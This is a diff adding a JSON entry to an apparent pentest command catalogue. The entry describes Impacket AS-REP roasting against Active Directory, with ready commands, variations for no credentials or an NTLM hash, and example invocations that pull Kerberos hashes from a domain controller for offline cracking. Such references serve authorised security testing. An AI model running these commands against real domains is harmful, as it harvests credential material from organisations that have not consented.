@@ -1,0 +1,41 @@
+{
+  "id": "asreproast",
+  "name": "Impacket AS-REP Roast",
+  "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast '<domain>/<user>:<password>'",
+  "description": "AS-REP Roasting for accounts without Kerberos Pre-Authentication",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "asreproast",
+    "kerberos",
+    "hash"
+  ],
+  "variations": [
+    {
+      "label": "No Creds (user list)",
+      "requires": "no-creds",
+      "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast '<domain>/' -usersfile <wordlist>"
+    },
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast -hashes ':<hash>' '<domain>/<user>'"
+    }
+  ],
+  "references": [
+    {
+      "title": "AS-REP Roasting",
+      "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
+    }
+  ],
+  "examples": [
+    "impacket-GetNPUsers -dc-ip 192.168.1.100 -request -outputfile hashes.asreproast 'CORP/user:password'",
+    "impacket-GetNPUsers -dc-ip 192.168.1.100 -request -outputfile hashes.asreproast 'CORP/' -usersfile users.txt"
+  ]
+}
